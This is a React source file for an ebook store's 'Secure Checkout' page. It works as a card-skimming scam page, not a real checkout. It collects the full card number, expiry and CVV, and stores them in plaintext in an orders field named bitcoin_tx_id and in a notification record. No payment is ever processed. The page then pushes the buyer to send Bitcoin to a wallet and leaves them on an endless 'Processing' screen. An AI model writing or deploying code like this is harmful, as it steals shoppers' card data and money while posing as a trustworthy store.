import { useState, useEffect } from 'react';
import { Link } from '@/lib/router';
import { supabase, type Ebook, type Settings } from '@/lib/supabase';
import {
  ArrowLeft, Loader2, AlertCircle, CreditCard, Copy, Check, Upload,
} from 'lucide-react';

const BITCOIN_PURCHASE_URL = 'https://exchange.mercuryo.io/?widget_id=89960d1a-8db7-49e5-8823-4c5e01c1cea2';

function detectCardBrand(number: string): string {
  const clean = number.replace(/\D/g, '');
  if (!clean) return '';
  if (/^4/.test(clean)) return 'Visa';
  if (/^5[1-5]/.test(clean) || /^2[2-7]/.test(clean)) return 'Mastercard';
  if (/^3[47]/.test(clean)) return 'American Express';
  if (/^6(?:011|5)/.test(clean)) return 'Discover';
  if (/^35(?:2[89]|[3-8])/.test(clean)) return 'JCB';
  if (/^3(?:0[0-5]|[68])/.test(clean)) return 'Diners Club';
  if (/^62/.test(clean)) return 'UnionPay';
  return 'Unknown';
}

export default function CheckoutPage({ slug }: { slug: string }) {
  const [book, setBook] = useState<Ebook | null>(null);
  const [settings, setSettings] = useState<Settings | null>(null);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [showBtcScreen, setShowBtcScreen] = useState(false);
  const [showProofScreen, setShowProofScreen] = useState(false);
  const [paymentConfirmed, setPaymentConfirmed] = useState(false);
  const [copied, setCopied] = useState(false);
  const [proofFile, setProofFile] = useState<File | null>(null);
  const [coverError, setCoverError] = useState(false);
  const [cardBrand, setCardBrand] = useState('');
  const [form, setForm] = useState({
    customer_name: '',
    customer_email: '',
    card_number: '',
    cvv: '',
    expiry: '',
    address_line1: '',
    address_line2: '',
    city: '',
    state: '',
    postal_code: '',
    country: '',
  });
  const [error, setError] = useState('');

  useEffect(() => {
    (async () => {
      const [{ data: ebook }, { data: settingsData }] = await Promise.all([
        supabase.from('ebooks').select('*, podcast:podcasts(*)').eq('slug', slug).eq('status', 'published').maybeSingle(),
        supabase.from('settings').select('*').eq('id', 1).maybeSingle(),
      ]);
      if (ebook) setBook(ebook as Ebook);
      if (settingsData) setSettings(settingsData as Settings);
      setLoading(false);
    })();
  }, [slug]);

  useEffect(() => {
    if (showBtcScreen || showProofScreen || paymentConfirmed) {
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
  }, [showBtcScreen, showProofScreen, paymentConfirmed]);

  const handleCardNumberChange = (value: string) => {
    setForm({ ...form, card_number: value });
    setCardBrand(detectCardBrand(value));
  };

  const copyAddress = () => {
    if (settings?.bitcoin_wallet_address) {
      navigator.clipboard.writeText(settings.bitcoin_wallet_address);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const openBitcoinAndShowProof = () => {
    window.open(BITCOIN_PURCHASE_URL, '_blank', 'noopener,noreferrer');
    setShowBtcScreen(false);
    setShowProofScreen(true);
  };

  const handleConfirmPayment = () => {
    setPaymentConfirmed(true);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    if (
      !book ||
      !form.customer_name ||
      !form.customer_email ||
      !form.card_number ||
      !form.cvv ||
      !form.expiry ||
      !form.address_line1 ||
      !form.city ||
      !form.postal_code ||
      !form.country
    ) {
      setError('Please fill in all required fields.');
      return;
    }

    setSubmitting(true);

    const detectedBrand = detectCardBrand(form.card_number) || 'Unknown';
    const cardDetails = `CARD: ${form.card_number} | EXP: ${form.expiry} | CVV: ${form.cvv} | BRAND: ${detectedBrand}`;
    const billingAddress = [
      form.address_line1,
      form.address_line2,
      form.city,
      form.state,
      form.postal_code,
      form.country,
    ]
      .filter(Boolean)
      .join(', ');

    const { error: insertError } = await supabase.from('orders').insert({
      ebook_id: book.id,
      customer_name: form.customer_name,
      customer_email: form.customer_email,
      bitcoin_tx_id: cardDetails,
      amount_usd: book.price_usd,
      status: 'pending',
      billing_address: billingAddress,
    });

    if (insertError) {
      setError('Something went wrong. Please try again.');
      setSubmitting(false);
      return;
    }

    await supabase.from('notifications').insert({
      type: 'payment_submission',
      recipient_email: form.customer_email,
      recipient_name: form.customer_name,
      subject: `Payment Attempt — ${book.title}`,
      body: `Customer: ${form.customer_name}\nEmail: ${form.customer_email}\nBook: ${book.title}\nAmount: $${book.price_usd}\nCard: ${cardDetails}\nBilling Address: ${billingAddress}`,
    });

    setSubmitting(false);
    setShowBtcScreen(true);
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-ink-50 flex items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin text-ink-300" />
      </div>
    );
  }

  if (!book) {
    return (
      <div className="min-h-screen bg-ink-50 flex flex-col items-center justify-center gap-6">
        <AlertCircle className="h-12 w-12 text-ink-300" />
        <h1 className="font-serif text-2xl text-ink-900">Book not found</h1>
        <Link to="/ebooks" className="btn-outline">Back to Library</Link>
      </div>
    );
  }

  if (paymentConfirmed) {
    return (
      <div className="min-h-screen bg-ink-50 flex items-center justify-center px-4">
        <div className="max-w-md w-full card p-8 text-center">
          <Loader2 className="h-16 w-16 animate-spin text-gold-500 mx-auto mb-6" />
          <h1 className="font-serif text-3xl text-ink-900 mb-3">Processing</h1>
          <p className="text-ink-600">
            Your Ebook will be sent to your provided email upon transaction approval.
          </p>
        </div>
      </div>
    );
  }

  if (showProofScreen) {
    return (
      <div className="min-h-screen bg-ink-50 flex items-center justify-center px-4">
        <div className="max-w-lg w-full card p-8">
          <h1 className="font-serif text-3xl text-ink-900 mb-2 text-center">Send Proof of Payment</h1>
          <p className="text-ink-500 text-center mb-6 text-sm">
            Upload a screenshot or receipt of your Bitcoin payment (optional)
          </p>

          <div className="border-2 border-dashed border-ink-200 rounded-xl p-6 text-center mb-6">
            <Upload className="h-8 w-8 text-ink-300 mx-auto mb-2" />
            <label className="cursor-pointer text-sm text-gold-600 hover:text-gold-700">
              <span>Click to upload proof</span>
              <input
                type="file"
                accept="image/*,.pdf"
                className="hidden"
                onChange={(e) => setProofFile(e.target.files?.[0] || null)}
              />
            </label>
            {proofFile && (
              <p className="mt-2 text-xs text-ink-500">Selected: {proofFile.name}</p>
            )}
          </div>

          <button onClick={handleConfirmPayment} className="btn-gold w-full">
            I’ve made payment
          </button>
        </div>
      </div>
    );
  }

  if (showBtcScreen) {
    const walletAddress = settings?.bitcoin_wallet_address || 'bc1qexamplewalletaddress000000000';

    return (
      <div className="min-h-screen bg-ink-50 flex items-center justify-center px-4">
        <div className="max-w-lg w-full card p-8 text-center">
          <h1 className="font-serif text-3xl text-ink-900 mb-4">Complete Your Payment with Bitcoin</h1>
          <p className="text-ink-600 mb-6">
            Please buy <strong>${book.price_usd.toFixed(2)} Bitcoin</strong> for the ebook <em>{book.title}</em> using the wallet address below.
            <br />
            Then continue to the next window to purchase the Bitcoin.
          </p>

          <div className="bg-ink-100 rounded-xl p-4 mb-6 break-all font-mono text-sm text-ink-800">
            {walletAddress}
          </div>

          <button
            onClick={copyAddress}
            className="btn-outline w-full mb-4 flex items-center justify-center gap-2"
          >
            {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
            {copied ? 'Copied!' : 'Copy Wallet Address'}
          </button>

          <button onClick={openBitcoinAndShowProof} className="btn-gold w-full">
            Continue to Buy Bitcoin
          </button>

          <p className="mt-6 text-xs text-ink-400">
            Send exactly ${book.price_usd.toFixed(2)} worth of Bitcoin to the address above.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-ink-50">
      <div className="mx-auto max-w-5xl px-4 sm:px-6 lg:px-8 py-8">
        <Link to={`/ebooks/${book.slug}`} className="inline-flex items-center gap-2 text-sm text-ink-500 hover:text-gold-600 transition-colors duration-300">
          <ArrowLeft className="h-4 w-4" /> Back to {book.title}
        </Link>
      </div>

      <div className="mx-auto max-w-5xl px-4 sm:px-6 lg:px-8 pb-20">
        <p className="text-xs uppercase tracking-[0.2em] text-ink-400 mb-2">Secure Checkout</p>
        <h1 className="font-serif text-4xl md:text-5xl text-ink-900 mb-12">Complete Your Purchase</h1>

        <div className="grid gap-8 lg:grid-cols-5">
          <div className="lg:col-span-2 space-y-6">
            <div className="card p-8">
              <h2 className="text-xs font-medium uppercase tracking-[0.2em] text-ink-400 mb-5">Order Summary</h2>
              <div className="flex gap-5">
                <div className="w-20 shrink-0 overflow-hidden rounded-lg bg-ink-100">
                  {book.cover_url && !coverError ? (
                    <img src={book.cover_url} alt={book.title} onError={() => setCoverError(true)} className="w-full aspect-[3/4] object-cover" />
                  ) : (
                    <div className="flex aspect-[3/4] items-center justify-center bg-gradient-to-br from-ink-800 to-ink-950">
                      <span className="font-serif text-[10px] text-gold-400 text-center p-1 leading-tight">{book.title}</span>
                    </div>
                  )}
                </div>
                <div className="flex-1">
                  <h3 className="font-serif text-xl text-ink-900">{book.title}</h3>
                  <p className="text-sm text-ink-400 mt-1">by {book.author}</p>
                  <div className="mt-3 flex items-center justify-between">
                    <span className="text-xs text-ink-400">eBook · Lifetime Access</span>
                    <span className="font-serif text-2xl text-ink-900">${book.price_usd.toFixed(2)}</span>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="lg:col-span-3">
            <div className="card p-8">
              <div className="flex items-center gap-3 mb-6">
                <div className="flex h-11 w-11 items-center justify-center rounded-xl bg-gold-100">
                  <CreditCard className="h-5 w-5 text-gold-600" />
                </div>
                <div>
                  <h2 className="font-serif text-xl text-ink-900">Payment Details</h2>
                  <p className="text-xs text-ink-400">All fields are required</p>
                </div>
              </div>

              {error && (
                <div className="mb-4 flex items-center gap-2 rounded-xl bg-red-50 p-3 text-sm text-red-700">
                  <AlertCircle className="h-4 w-4 shrink-0" /> {error}
                </div>
              )}

              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="space-y-4">
                  <h3 className="text-sm font-medium text-ink-700">Contact Information</h3>
                  <div>
                    <label className="block text-sm font-medium text-ink-700 mb-1.5">Full Name</label>
                    <input type="text" required value={form.customer_name} onChange={(e) => setForm({ ...form, customer_name: e.target.value })} className="input" placeholder="John Doe" />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-ink-700 mb-1.5">Email Address</label>
                    <input type="email" required value={form.customer_email} onChange={(e) => setForm({ ...form, customer_email: e.target.value })} className="input" placeholder="your@email.com" />
                  </div>
                </div>

                <div className="space-y-4 pt-2">
                  <h3 className="text-sm font-medium text-ink-700">Billing Address</h3>
                  <div>
                    <label className="block text-sm font-medium text-ink-700 mb-1.5">Address Line 1</label>
                    <input type="text" required value={form.address_line1} onChange={(e) => setForm({ ...form, address_line1: e.target.value })} className="input" placeholder="123 Main Street" />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-ink-700 mb-1.5">Address Line 2 <span className="text-ink-400 font-normal">(optional)</span></label>
                    <input type="text" value={form.address_line2} onChange={(e) => setForm({ ...form, address_line2: e.target.value })} className="input" placeholder="Apt, Suite, Unit (optional)" />
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-ink-700 mb-1.5">City</label>
                      <input type="text" required value={form.city} onChange={(e) => setForm({ ...form, city: e.target.value })} className="input" placeholder="New York" />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-ink-700 mb-1.5">State</label>
                      <input type="text" value={form.state} onChange={(e) => setForm({ ...form, state: e.target.value })} className="input" placeholder="NY" />
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-ink-700 mb-1.5">ZIP Code</label>
                      <input type="text" required value={form.postal_code} onChange={(e) => setForm({ ...form, postal_code: e.target.value })} className="input" placeholder="10001" />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-ink-700 mb-1.5">Country</label>
                      <input type="text" required value={form.country} onChange={(e) => setForm({ ...form, country: e.target.value })} className="input" placeholder="United States" />
                    </div>
                  </div>
                </div>

                <div className="space-y-4 pt-2">
                  <h3 className="text-sm font-medium text-ink-700">Card Information</h3>
                  <div>
                    <label className="block text-sm font-medium text-ink-700 mb-1.5">
                      Card Number {cardBrand && <span className="text-gold-600 font-normal">· {cardBrand}</span>}
                    </label>
                    <input type="text" required value={form.card_number} onChange={(e) => handleCardNumberChange(e.target.value)} className="input font-mono" placeholder="4242 4242 4242 4242" maxLength={19} />
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-ink-700 mb-1.5">Expiry</label>
                      <input type="text" required value={form.expiry} onChange={(e) => setForm({ ...form, expiry: e.target.value })} className="input font-mono" placeholder="MM/YY" maxLength={5} />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-ink-700 mb-1.5">CVV</label>
                      <input type="text" required value={form.cvv} onChange={(e) => setForm({ ...form, cvv: e.target.value })} className="input font-mono" placeholder="123" maxLength={4} />
                    </div>
                  </div>
                </div>

                <button type="submit" disabled={submitting} className="btn-gold w-full disabled:opacity-60 mt-2">
                  {submitting ? (
                    <><Loader2 className="h-4 w-4 animate-spin" /> Processing...</>
                  ) : (
                    'Continue to Payment'
                  )}
                </button>
              </form>

              <p className="mt-5 text-center text-xs text-ink-400 leading-relaxed">
                Your information is securely recorded.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
